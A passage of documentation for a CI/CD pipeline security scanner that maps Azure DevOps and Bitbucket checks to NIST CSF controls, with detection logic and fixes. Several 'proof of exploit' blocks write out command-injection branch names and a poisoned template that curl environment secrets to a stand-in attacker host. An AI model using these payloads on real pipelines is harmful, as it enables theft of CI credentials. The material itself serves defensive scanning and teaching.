| [`SCM-004`](#detail-scm-004) | GitHub secret scanning is not enabled | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-015`](#detail-scm-015) | Secret scanning push protection is not enabled | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-040`](#detail-scm-040) | Active ruleset doesn't gate on code scanning results | <span class="pg-sev pg-sev--low">LOW</span> | [SCM](../providers/scm.md) |  |

### DE.AE-03: Information is correlated from multiple sources { #ctrl-de-ae-03 }

**Evidenced by 2 checks** across AWS.

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`CT-002`](#detail-ct-002) | CloudTrail log-file validation disabled | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`S3-004`](#detail-s3-004) | Artifact bucket access logging not enabled | <span class="pg-sev pg-sev--low">LOW</span> | [AWS](../providers/aws.md) |  |

### RS.MA-01: The incident response plan is executed once an incident is declared { #ctrl-rs-ma-01 }

**Evidenced by 2 checks** across 2 providers (AWS, SCM).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`CD-003`](#detail-cd-003) | No CloudWatch alarm monitoring on deployment group | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`SCM-016`](#detail-scm-016) | Private vulnerability reporting is not enabled | <span class="pg-sev pg-sev--low">LOW</span> | [SCM](../providers/scm.md) |  |

### RC.RP-01: The recovery portion of the incident response plan is executed once initiated { #ctrl-rc-rp-01 }

**Evidenced by 2 checks** across AWS.

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`CD-001`](#detail-cd-001) | Automatic rollback on failure not enabled | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`S3-003`](#detail-s3-003) | Artifact bucket versioning not enabled | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |

## Check details

Every check that evidences this standard, rendered once with its detection mechanism, recommendation, and any known false-positive modes or real-world incident references. The per-control tables above link to the matching block here.

#### `ADO-001`: Task reference not pinned to specific version <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-ado-001 }

**Evidences:** [`GV.SC-05`](#ctrl-gv-sc-05) Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts, [`GV.SC-07`](#ctrl-gv-sc-07) Risks posed by suppliers, their products and services, are understood, recorded, prioritized, assessed, responded to, and monitored.

**How this is detected.** Floating-major task references (`@1`, `@2`) can roll forward silently when the task publisher ships a breaking or malicious update. Pass when every `task:` reference carries a two- or three-segment semver.

**Recommendation.** Reference tasks by a full semver (`DownloadSecureFile@1.2.3`) or extension-published-version. Track task updates explicitly via Azure DevOps extension settings rather than letting `@1` drift.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`ADO-001`](../providers/azure.md#ado-001) in the [Azure DevOps provider](../providers/azure.md).

#### `ADO-002`: Script injection via attacker-controllable context <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ado-002 }

**Evidences:** [`PR.PS-05`](#ctrl-pr-ps-05) Installation and execution of unauthorized software are prevented.

**How this is detected.** `$(Build.SourceBranch*)`, `$(Build.SourceVersionMessage)`, and `$(System.PullRequest.*)` are populated from SCM event metadata the attacker controls. Inline interpolation into a script body executes crafted content.

**Recommendation.** Pass these values through an intermediate pipeline variable declared with `readonly: true`, and reference that variable through an environment variable rather than `$(...)` macro interpolation. ADO expands `$(…)` before shell quoting, so inline use is never safe.

**Proof of exploit.**

# Vulnerable: PR title macro interpolated straight into script.
trigger: none
pr:
  branches:
    include: [main]
jobs:
  - job: triage
    pool: { vmImage: ubuntu-latest }
    steps:
      - script: |
          echo "New PR: $(System.PullRequest.SourceBranch)"
          echo "Subject: $(Build.SourceVersionMessage)"

# Attack: open a PR from a branch whose name carries shell:
#
#   git checkout -b 'foo";curl https://attacker/exfil \
#     -d "$(printenv | base64)";echo "x'
#
# ADO expands ``$(...)`` BEFORE shell quoting, so the macro
# value's `"` closes the echo and the rest becomes shell.
# The PR-validated pipeline has the same service-connection
# credentials a main-branch build would have, so the curl
# exfils every secret in scope. Classic pwn-request shape.

# Safe: route through env so the value is never interpolated
# into the shell template.
      - bash: |
          echo "New PR: $PR_BRANCH"
          echo "Subject: $COMMIT_MSG"
        env:
          PR_BRANCH: $(System.PullRequest.SourceBranch)
          COMMIT_MSG: $(Build.SourceVersionMessage)

**Source:** [`ADO-002`](../providers/azure.md#ado-002) in the [Azure DevOps provider](../providers/azure.md).

#### `ADO-003`: Variables contain literal secret values <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-ado-003 }

**Evidences:** [`PR.AA-01`](#ctrl-pr-aa-01) Identities and credentials for authorized users, services, and hardware are managed.

**How this is detected.** Scans `variables:` in both the mapping form (`{KEY: VAL}`) and the list form (`[{name: X, value: Y}]`) that ADO supports. AWS keys are detected by value shape regardless of variable name.

**Recommendation.** Store secrets in an Azure Key Vault or a Library variable group with the secret flag set; reference them via `$(SECRET_NAME)` at runtime. For cloud access prefer Azure workload identity federation.

**Source:** [`ADO-003`](../providers/azure.md#ado-003) in the [Azure DevOps provider](../providers/azure.md).

#### `ADO-005`: Container image not pinned to specific version <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ado-005 }

**Evidences:** [`GV.SC-05`](#ctrl-gv-sc-05) Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts.

**How this is detected.** Container images can be declared at `resources.containers[].image` or `job.container` (string or `{image:}`). Floating / untagged refs let the publisher swap the image contents.

**Recommendation.** Reference images by `@sha256:<digest>` or at minimum a full immutable version tag. Avoid `:latest` and untagged refs.

**Source:** [`ADO-005`](../providers/azure.md#ado-005) in the [Azure DevOps provider](../providers/azure.md).

#### `ADO-006`: Artifacts not signed <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ado-006 }

**Evidences:** [`PR.PS-06`](#ctrl-pr-ps-06) Secure software development practices are integrated, and their performance is monitored throughout the SDLC.

**How this is detected.** Passes when cosign / sigstore / slsa-* / notation-sign appears anywhere in the pipeline text.

**Recommendation.** Add a task that runs `cosign sign` or `notation sign`, Azure Pipelines' workload identity federation enables keyless signing. Publish the signature to the artifact feed and verify it at deploy time.

**Source:** [`ADO-006`](../providers/azure.md#ado-006) in the [Azure DevOps provider](../providers/azure.md).

#### `ADO-007`: SBOM not produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ado-007 }

**Evidences:** [`GV.SC-03`](#ctrl-gv-sc-03) Cybersecurity supply chain risk management is integrated into CS and ERM programs, [`GV.SC-04`](#ctrl-gv-sc-04) Suppliers are known and prioritized by criticality.

**How this is detected.** Without an SBOM, downstream consumers can't audit the dependency set shipped in the artifact.

**Recommendation.** Add an SBOM step, `microsoft/sbom-tool`, `syft . -o cyclonedx-json`, or `anchore/sbom-action`. Publish the SBOM as a pipeline artifact so downstream consumers can ingest it.

**Source:** [`ADO-007`](../providers/azure.md#ado-007) in the [Azure DevOps provider](../providers/azure.md).

#### `ADO-008`: Credential-shaped literal in pipeline body <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-ado-008 }

**Evidences:** [`PR.AA-01`](#ctrl-pr-aa-01) Identities and credentials for authorized users, services, and hardware are managed.

**How this is detected.** Complements ADO-003 (which looks at `variables:` keys). ADO-008 scans every string in the pipeline against the cross-provider credential-pattern catalog.

**Recommendation.** Rotate the exposed credential. Move the value to Azure Key Vault or a secret variable group and reference it via `$(SECRET_NAME)`.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Test fixtures and documentation blobs sometimes embed credential-shaped strings (JWT samples, AKIAI... examples). The AWS canonical example ``AKIAIOSFODNN7EXAMPLE`` is deliberately NOT suppressed, if it appears in a real pipeline it almost always means a copy-paste from docs was never substituted. Defaults to LOW confidence.

**Source:** [`ADO-008`](../providers/azure.md#ado-008) in the [Azure DevOps provider](../providers/azure.md).

#### `ADO-009`: Container image pinned by tag rather than sha256 digest <span class="pg-sev pg-sev--low">LOW</span> { #detail-ado-009 }

**Evidences:** [`GV.SC-05`](#ctrl-gv-sc-05) Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts.

**How this is detected.** ADO-005 fails floating tags at HIGH; ADO-009 is the stricter tier. Even immutable-looking version tags can be repointed by registry operators.

**Recommendation.** Resolve each image to its current digest and replace the tag with `@sha256:<digest>`. Schedule regular digest bumps via Renovate or a scheduled pipeline.

**Source:** [`ADO-009`](../providers/azure.md#ado-009) in the [Azure DevOps provider](../providers/azure.md).

#### `ADO-010`: Cross-pipeline `download:` ingestion unverified <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-ado-010 }

**Evidences:** [`PR.IR-01`](#ctrl-pr-ir-01) Networks and environments are protected from unauthorized logical access and usage.

**How this is detected.** `resources.pipelines:` declares an upstream pipeline; a `download: <name>` step pulls its artifacts. If the upstream accepts PR validation, the artifact may have been built by PR-controlled code.

**Recommendation.** Add a verification step before consuming the artifact: `cosign verify-attestation`, `sha256sum -c`, or `gpg --verify` against a manifest the producing pipeline signed.

**Source:** [`ADO-010`](../providers/azure.md#ado-010) in the [Azure DevOps provider](../providers/azure.md).

#### `ADO-011`: `template: <local-path>` on PR-validated pipeline <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ado-011 }

**Evidences:** [`PR.IR-01`](#ctrl-pr-ir-01) Networks and environments are protected from unauthorized logical access and usage.

**How this is detected.** `template: <relative-path>` includes another YAML from the CURRENT repo. On PR validation builds, the repo content is the PR branch, letting the PR author swap the template body. Cross-repo templates (`template: foo.yml@my-repo`) are version-pinned and not affected.

**Recommendation.** Move the template into a separate, branch-protected repository and reference it via `template: foo.yml@<repo-resource>` with a pinned `ref:` on the resource. That way the template content is fixed at PR creation time and can't be modified from the PR branch.

**Source:** [`ADO-011`](../providers/azure.md#ado-011) in the [Azure DevOps provider](../providers/azure.md).

#### `ADO-012`: Cache@2 key derives from $(System.PullRequest.*) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ado-012 }

**Evidences:** [`PR.IR-01`](#ctrl-pr-ir-01) Networks and environments are protected from unauthorized logical access and usage.

**How this is detected.** `Cache@2` (and older `CacheBeta@1`) restore by key. A key including PR-controlled variables on PR-validated pipelines lets a PR seed a poisoned cache entry that a later default-branch pipeline restores.

**Recommendation.** Build the cache key from values the PR can't control: `$(Agent.OS)`, lockfile hashes, the pipeline name. Never reference `$(System.PullRequest.*)` or `$(Build.SourceBranch*)` from a cache key namespace.

**Source:** [`ADO-012`](../providers/azure.md#ado-012) in the [Azure DevOps provider](../providers/azure.md).

#### `ADO-013`: Self-hosted pool without explicit ephemeral marker <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ado-013 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied.

**How this is detected.** `pool: { name: <agent-pool> }` (or the bare string form `pool: <name>`) targets a self-hosted agent pool. Without an explicit ephemeral arrangement, agents reuse state across jobs. Microsoft-hosted pools (`vmImage:` or the `Azure Pipelines` / `Default` names) are skipped.

**Recommendation.** Configure the agent pool with autoscaling + ephemeral agents (the Azure VM Scale Set agent), and add `demands: [ephemeral -equals true]` on the pool block so this check can verify it.

**Source:** [`ADO-013`](../providers/azure.md#ado-013) in the [Azure DevOps provider](../providers/azure.md).

#### `ADO-014`: AWS auth uses long-lived access keys <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-ado-014 }

**Evidences:** [`PR.AA-01`](#ctrl-pr-aa-01) Identities and credentials for authorized users, services, and hardware are managed.

**How this is detected.** Long-lived `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY` values in pipeline variables or task inputs can't be rotated on a fine-grained schedule. Prefer OIDC or vault-based credential injection for cross-cloud access.

**Recommendation.** Use workload identity federation or an Azure Key Vault task to inject short-lived AWS credentials at runtime. Remove static AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY from pipeline variables and task parameters.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Variable values that *reference* a secret rather than embed one (``$(MySecretVar)`` / ``$(AwsKey)`` mapped from a variable group backed by Key Vault) still match the ``AWS_ACCESS_KEY_ID`` / ``AWS_SECRET_ACCESS_KEY`` name regex because the variable name itself looks long-lived. The rule has no way to follow the binding to its source. Suppress per-pipeline via ``--ignore-file`` once you've confirmed the value is injected at runtime from a Key Vault group rather than stored in the YAML.

**Source:** [`ADO-014`](../providers/azure.md#ado-014) in the [Azure DevOps provider](../providers/azure.md).

#### `ADO-015`: Job has no `timeoutInMinutes`, unbounded build <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-ado-015 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied.

**How this is detected.** Without `timeoutInMinutes`, the job runs until Azure's 60-minute default kills it. Explicit timeouts cap blast radius and the window during which a compromised step has access to service connections.

**Recommendation.** Add `timeoutInMinutes:` to each job, sized to the 95th percentile of historical runtime plus margin. Azure's default is 60 minutes, an explicitly shorter value limits blast radius and agent cost.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`ADO-015`](../providers/azure.md#ado-015) in the [Azure DevOps provider](../providers/azure.md).

#### `ADO-016`: Remote script piped to shell interpreter <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-ado-016 }

**Evidences:** [`PR.PS-05`](#ctrl-pr-ps-05) Installation and execution of unauthorized software are prevented.

**How this is detected.** Detects `curl | bash`, `wget | sh`, and similar patterns that pipe remote content directly into a shell interpreter inside a pipeline. An attacker who controls the remote endpoint (or poisons DNS / CDN) gains arbitrary code execution in the build agent.

**Recommendation.** Download the script to a file, verify its checksum, then execute it. Or vendor the script into the repository.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Established vendor installers (get.docker.com, sh.rustup.rs, bun.sh/install, awscli.amazonaws.com, cli.github.com, ...) ship via HTTPS from their own CDN and are idiomatic. This rule defaults to LOW confidence so CI gates can ignore them with --min-confidence MEDIUM; the finding still surfaces so teams that want cryptographic verification can audit.

**Source:** [`ADO-016`](../providers/azure.md#ado-016) in the [Azure DevOps provider](../providers/azure.md).

#### `ADO-017`: Docker run with insecure flags (privileged/host mount) <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-ado-017 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied.

**How this is detected.** Flags like `--privileged`, `--cap-add`, `--net=host`, or host-root volume mounts (`-v /:/`) in a pipeline give the container full access to the build agent, enabling container escape and lateral movement.

**Recommendation.** Remove --privileged and --cap-add flags. Use minimal volume mounts. Prefer rootless containers.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`ADO-017`](../providers/azure.md#ado-017) in the [Azure DevOps provider](../providers/azure.md).

#### `ADO-018`: Package install from insecure source <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-ado-018 }

**Evidences:** [`GV.SC-04`](#ctrl-gv-sc-04) Suppliers are known and prioritized by criticality.

**How this is detected.** Detects package-manager invocations that use plain HTTP registries (`--index-url http://`, `--registry=http://`) or disable TLS verification (`--trusted-host`, `--no-verify`) in a pipeline. These patterns allow man-in-the-middle injection of malicious packages.

**Recommendation.** Use HTTPS registry URLs. Remove --trusted-host and --no-verify flags. Pin to a private registry with TLS.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`ADO-018`](../providers/azure.md#ado-018) in the [Azure DevOps provider](../providers/azure.md).

#### `ADO-019`: `extends:` template on PR-validated pipeline points to local path <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-ado-019 }

**Evidences:** [`PR.IR-01`](#ctrl-pr-ir-01) Networks and environments are protected from unauthorized logical access and usage.

**How this is detected.** `extends: template: <local-file>` includes another YAML from the CURRENT repo. On PR validation builds, the repo content is the PR branch, letting the PR author swap the template body and inject arbitrary pipeline logic. Cross-repo templates (`template: foo.yml@my-repo`) are version-pinned and not affected.

**Recommendation.** Pin the extends template to a protected repository ref (`template@ref`). Local templates in PR-validated pipelines can be poisoned by the PR author.

**Proof of exploit.**

# Vulnerable: PR-validated pipeline extends a LOCAL template.
trigger: none
pr:
  branches: { include: [main] }
extends:
  template: templates/standard-build.yml   # no @repo ref

# Attack: a PR author edits ``templates/standard-build.yml``
# in their branch to inject any pipeline body they want.
# The PR-validation run materializes the PR branch first,
# THEN evaluates ``extends:`` against that tree, so the
# attacker's template body runs with the pipeline's service
# connections in scope.
#
# In the PR's templates/standard-build.yml:
#   jobs:
#     - job: exfil
#       steps:
#         - bash: |
#             curl https://attacker.example/x \
#               -d "$(printenv | base64 -w0)"
#
# No further trick needed, ``extends:`` is the gate and the
# PR author controls what's behind it.

# Safe: pin the template to a protected ref in a separate repo.
resources:
  repositories:
    - repository: pipeline-templates
      type: git
      name: ProjectName/pipeline-templates
      ref: refs/tags/v1.4.2     # immutable, signed tag
extends:
  template: templates/standard-build.yml@pipeline-templates

**Source:** [`ADO-019`](../providers/azure.md#ado-019) in the [Azure DevOps provider](../providers/azure.md).

#### `ADO-020`: No vulnerability scanning step <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ado-020 }

**Evidences:** [`PR.PS-02`](#ctrl-pr-ps-02) Software is maintained, replaced, and removed commensurate with risk.

**How this is detected.** Without a vulnerability scanning step, known-vulnerable dependencies ship to production undetected. The check recognizes trivy, grype, snyk, npm audit, yarn audit, safety check, pip-audit, osv-scanner, and govulncheck.

**Recommendation.** Add a vulnerability scanning step, trivy, grype, snyk test, npm audit, pip-audit, or osv-scanner. Publish results so vulnerabilities surface before deployment.

**Source:** [`ADO-020`](../providers/azure.md#ado-020) in the [Azure DevOps provider](../providers/azure.md).

#### `ADO-021`: Package install without lockfile enforcement <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-ado-021 }

**Evidences:** [`GV.SC-05`](#ctrl-gv-sc-05) Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts.

**How this is detected.** Detects package-manager install commands that do not enforce a lockfile or hash verification. Without lockfile enforcement the resolver pulls whatever version is currently latest, exactly the window a supply-chain attacker exploits.

**Recommendation.** Use lockfile-enforcing install commands: `npm ci` instead of `npm install`, `pip install --require-hashes -r requirements.txt`, `yarn install --frozen-lockfile`, `bundle install --frozen`, and `go install tool@v1.2.3`.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`ADO-021`](../providers/azure.md#ado-021) in the [Azure DevOps provider](../providers/azure.md).

#### `ADO-022`: Dependency update command bypasses lockfile pins <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-ado-022 }

**Evidences:** [`GV.SC-07`](#ctrl-gv-sc-07) Risks posed by suppliers, their products and services, are understood, recorded, prioritized, assessed, responded to, and monitored.

**How this is detected.** Detects `pip install --upgrade`, `npm update`, `yarn upgrade`, `bundle update`, `cargo update`, `go get -u`, and `composer update`. These commands bypass lockfile pins and pull whatever version is currently latest. Tooling upgrades (`pip install --upgrade pip`) are exempted.

**Recommendation.** Remove dependency-update commands from CI. Use lockfile-pinned install commands (`npm ci`, `pip install -r requirements.txt`) and update dependencies via a dedicated PR pipeline (e.g. Dependabot, Renovate).

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Common build-tool bootstrapping idioms (``pip install --upgrade pip``, ``pip install --upgrade setuptools wheel virtualenv``) and security-tool installs (``pip install --upgrade pip-audit / cyclonedx-bom / semgrep``) are exempted by the ``DEP_UPDATE_RE`` tooling allowlist. Other tooling-upgrade idioms not yet on the list can still trip the rule. Defaults to MEDIUM confidence so CI gates can require ``--min-confidence HIGH`` to ignore.

**Source:** [`ADO-022`](../providers/azure.md#ado-022) in the [Azure DevOps provider](../providers/azure.md).

#### `ADO-023`: TLS / certificate verification bypass <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-ado-023 }

**Evidences:** [`PR.DS-02`](#ctrl-pr-ds-02) The confidentiality, integrity, and availability of data-in-transit are protected.

**How this is detected.** Detects patterns that disable TLS certificate verification: `git config http.sslVerify false`, `NODE_TLS_REJECT_UNAUTHORIZED=0`, `npm config set strict-ssl false`, `curl -k`, `wget --no-check-certificate`, `PYTHONHTTPSVERIFY=0`, and `GOINSECURE=`. Disabling TLS verification allows MITM injection of malicious packages, repositories, or build tools.

**Recommendation.** Remove TLS verification bypasses. Fix certificate issues at the source (install CA certificates, configure proper trust stores) instead of disabling verification.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`ADO-023`](../providers/azure.md#ado-023) in the [Azure DevOps provider](../providers/azure.md).

#### `ADO-024`: No SLSA provenance attestation produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ado-024 }

**Evidences:** [`PR.PS-06`](#ctrl-pr-ps-06) Secure software development practices are integrated, and their performance is monitored throughout the SDLC.

**How this is detected.** On Azure Pipelines the common pattern is a ``Bash@3`` task invoking ``cosign attest --yes --predicate=provenance.json $(image)``. The native Microsoft SBOM tool emits ``_manifest/spdx_2.2/manifest.spdx.json`` for SBOM but does not produce provenance on its own.

**Recommendation.** Add a task that runs ``cosign attest`` against a ``provenance.intoto.jsonl`` statement, or Microsoft's ``sbom-tool`` in attestation mode. ADO-006 covers signing; this rule covers the in-toto statement SLSA Build L3 additionally requires.

**Source:** [`ADO-024`](../providers/azure.md#ado-024) in the [Azure DevOps provider](../providers/azure.md).

#### `ADO-025`: Cross-repo template not pinned to commit SHA <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ado-025 }

**Evidences:** [`GV.SC-05`](#ctrl-gv-sc-05) Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts.

**How this is detected.** Azure Pipelines resolves ``template: build.yml@tools`` against the ``tools`` repo resource's ``ref:`` field. When that ref is ``refs/heads/main`` (or missing, which defaults to the pipeline's default branch), a push to the callee repo changes what your pipeline runs on the next invocation.

**Recommendation.** On every ``resources.repositories`` entry referenced from a ``template: ...@repo-alias`` directive, set ``ref: refs/tags/<sha>`` or the bare 40-char commit SHA, never a branch or floating tag. A moved branch/tag swaps the template body without changing your pipeline file.

**Source:** [`ADO-025`](../providers/azure.md#ado-025) in the [Azure DevOps provider](../providers/azure.md).

#### `ADO-026`: Pipeline contains indicators of malicious activity <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-ado-026 }

**Evidences:** [`PR.PS-05`](#ctrl-pr-ps-05) Installation and execution of unauthorized software are prevented.

**How this is detected.** ADO pipelines can run arbitrary shell via ``bash`` / ``script`` / ``powershell`` tasks. This rule scans every string value for known-bad patterns (reverse shells, base64-decoded execution, miner binaries, exfil channels). Orthogonal to ADO-016/ADO-017/ADO-023.

**Recommendation.** Treat as a potential compromise. Identify the PR/branch that added the matching task(s), rotate any Service Connections the pipeline can reach, and audit Pipeline run logs for outbound traffic to the matched hosts.

**Known false positives.**

- Security-training repositories, CTF challenges, and red-team exercise pipelines legitimately contain reverse-shell strings or exfil domains as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare lines in a production pipeline still fire.
- Defaults to LOW confidence. Filter with ``--min-confidence MEDIUM`` to ignore all matches; the rule still surfaces the hit for teams that want to spot-check.

**Source:** [`ADO-026`](../providers/azure.md#ado-026) in the [Azure DevOps provider](../providers/azure.md).

#### `ADO-027`: Dangerous shell idiom (eval, sh -c variable, backtick exec) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ado-027 }

**Evidences:** [`PR.PS-05`](#ctrl-pr-ps-05) Installation and execution of unauthorized software are prevented.

**How this is detected.** Complements ADO-002 (script injection from untrusted PR context). Fires on intrinsically risky shell idioms, ``eval``, ``sh -c "$X"``, backtick exec, regardless of whether the input source is currently trusted.

**Recommendation.** Replace ``eval "$VAR"`` / ``sh -c "$VAR"`` / backtick exec with direct command invocation. Validate any value that must feed a dynamic command at the boundary.

**Known false positives.**

- ``eval "$(ssh-agent -s)"`` and similar ``eval "$(<literal-tool>)"`` bootstrap idioms are intentionally NOT flagged, the substituted command is literal, only its output is eval'd.

**Source:** [`ADO-027`](../providers/azure.md#ado-027) in the [Azure DevOps provider](../providers/azure.md).

#### `ADO-028`: Package install bypasses registry integrity (git / path / tarball source) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ado-028 }

**Evidences:** [`GV.SC-05`](#ctrl-gv-sc-05) Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts.

**How this is detected.** Complements ADO-021 (missing lockfile flag). Git URL installs without a commit pin, local-path installs, and direct tarball URLs bypass the registry integrity controls the lockfile relies on.

**Recommendation.** Pin git dependencies to a commit SHA. Publish private packages to an internal registry (Azure Artifacts) instead of installing from a filesystem path or tarball URL.

**Source:** [`ADO-028`](../providers/azure.md#ado-028) in the [Azure DevOps provider](../providers/azure.md).

#### `BB-001`: pipe: action not pinned to exact version <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bb-001 }

**Evidences:** [`GV.SC-05`](#ctrl-gv-sc-05) Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts, [`GV.SC-07`](#ctrl-gv-sc-07) Risks posed by suppliers, their products and services, are understood, recorded, prioritized, assessed, responded to, and monitored.

**How this is detected.** Bitbucket pipes are docker-image references. Major-only (`:1`) or missing tags let Atlassian/the publisher swap the image contents. Full semver or sha256 digest is required.

**Recommendation.** Pin every `pipe:` to a full semver tag (e.g. `atlassian/aws-s3-deploy:1.4.0`) or to an immutable SHA. Floating majors like `:1` can roll to new code silently.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`BB-001`](../providers/bitbucket.md#bb-001) in the [Bitbucket provider](../providers/bitbucket.md).

#### `BB-002`: Script injection via attacker-controllable context <span class="pg-sev pg-sev--high">HIGH</span> { #detail-bb-002 }

**Evidences:** [`PR.PS-05`](#ctrl-pr-ps-05) Installation and execution of unauthorized software are prevented.

**How this is detected.** $BITBUCKET_BRANCH, $BITBUCKET_TAG, and $BITBUCKET_PR_* are populated from SCM event metadata the attacker controls. Interpolating them unquoted into a shell command lets a crafted branch or tag name can execute inline.

**Recommendation.** Always double-quote interpolations of ref-derived variables (`"$BITBUCKET_BRANCH"`). Avoid passing them to `eval`, `sh -c`, or unquoted command arguments.

**Known false positives.**

- Pipelines that *parse* a ref name rather than execute it (``echo "$BITBUCKET_BRANCH" | cut -d/ -f2``) still interpolate the variable but expose no shell-execution surface for the value. The rule has no AST-level understanding of the surrounding shell context, so a well-quoted use that happens to live near an unrelated ``$(...)`` substitution can read as an offender. Suppress per-step via ``--ignore-file`` if the value is only consumed as data.

**Proof of exploit.**

# Vulnerable: branch name interpolated unquoted into shell.
image: alpine:latest
pipelines:
  pull-requests:
    '**':
      - step:
          name: triage
          script:
            - echo Building $BITBUCKET_BRANCH
            - ./scripts/build.sh $BITBUCKET_BRANCH

# Attack: open a PR from a branch whose name is shell:
#
#   git checkout -b 'foo;curl https://attacker/x \
#     -d "$(env|base64)";:'
#
# Bitbucket substitutes ``$BITBUCKET_BRANCH`` literally before
# the shell parses the line, so the `;` becomes a command
# separator and the curl exfils the step's env (which holds
# every repository / workspace variable in scope, including
# deploy keys configured for the pipeline).

# Safe: double-quote and pass via env so the value is only
# consumed as data.
      - step:
          name: triage
          script:
            - echo "Building $BRANCH"
            - ./scripts/build.sh "$BRANCH"
          # Bitbucket has no declarative env block; assign
          # via shell so the value is captured as a single
          # argv element from the controlled assignment.
          # (Equivalent: BRANCH="$BITBUCKET_BRANCH"; ...)

